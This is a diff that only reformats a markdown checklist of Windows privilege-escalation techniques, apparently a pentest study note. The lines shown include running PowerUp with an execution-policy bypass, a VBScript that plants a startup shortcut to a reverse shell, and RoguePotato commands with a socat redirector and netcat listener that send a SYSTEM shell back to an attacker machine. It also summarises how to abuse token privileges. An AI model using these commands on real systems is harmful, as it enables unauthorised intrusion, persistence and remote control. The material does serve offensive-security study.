@@ -7,7 +7,9 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
   example of usage: 
   - first get Powershell sessions 
     > powershell -exec bypass
+    
     > . .\PowerUp.ps1
+    
     > Invoke-AllChecks
   
 2- SharpUp: 
@@ -117,13 +119,9 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
    
 `Set oWS= WScript.CreateObject("WScript.Shell")
-
 sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
-
 Set oLink= oWS.CreateShortcut(sLinkFile)
-
 oLink.TargetPath= "C:\PrivEsc\reverse.exe"
-
 oLink.Save`
 
    - Finally: run the script:
@@ -157,10 +155,10 @@ oLink.Save`
         - Compiled Exploit: https://github.com/antonioCoco/RoguePotato/releases
       - Usage:
         - On Kali:
-          - First: Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows (192.168.1.22 is the Windows IP):
-            > sudo socat tcp-listen:135,reuseaddr,fork tcp:[Windows IP Machine]:9999
-          - Second: start listener
-            > nc -lvp [Port assign in reverse.exe shell]
+        - First: Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows (192.168.1.22 is the Windows IP):
+          > sudo socat tcp-listen:135,reuseaddr,fork tcp:[Windows IP Machine]:9999
+        - Second: start listener
+          > nc -lvp [Port assign in reverse.exe shell]
         
         - On Windows Victim machine:
         > C:\PrivEsc\RoguePotato.exe-r [Kali IP Machine] –l 9999 -e "C:\PrivEsc\reverse.exe"
@@ -188,19 +186,19 @@ oLink.Save`
     - Can be used to get PrivEsc by gaining access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
   - SeRestorePrivilege:
     - Can be used to get PrivEsc by multitude of ways to abuse this privilege:
-      • Modify service binaries.
-      • Overwrite DLLs used by SYSTEM processes
-      • Modify registry settings
+        • Modify service binaries.
+        • Overwrite DLLs used by SYSTEM processes
+        • Modify registry settings
   - SeTakeOwnershipPrivilege:
     - The SeTakeOwnership Privilege lets the user take ownership over an object (the WRITE_OWNER permission).
     - Once you own an object, you can modify its ACL and grant yourself write access.
     - The same methods used with SeRestorePrivilegethen apply.
       
   - Other Privileges (More Advanced) can be used on Privilege Escalation process: 
-    • SeTcbPrivilege
-    • SeCreateTokenPrivilege
-    • SeLoadDriverPrivilege
-    • SeDebugPrivilege(used by getsystem)
+      • SeTcbPrivilege
+      • SeCreateTokenPrivilege
+      • SeLoadDriverPrivilege
+      • SeDebugPrivilege(used by getsystem)
 ## Privileges Escalition:
   1- Check your user (whoami) and groups (net user <username>)
   
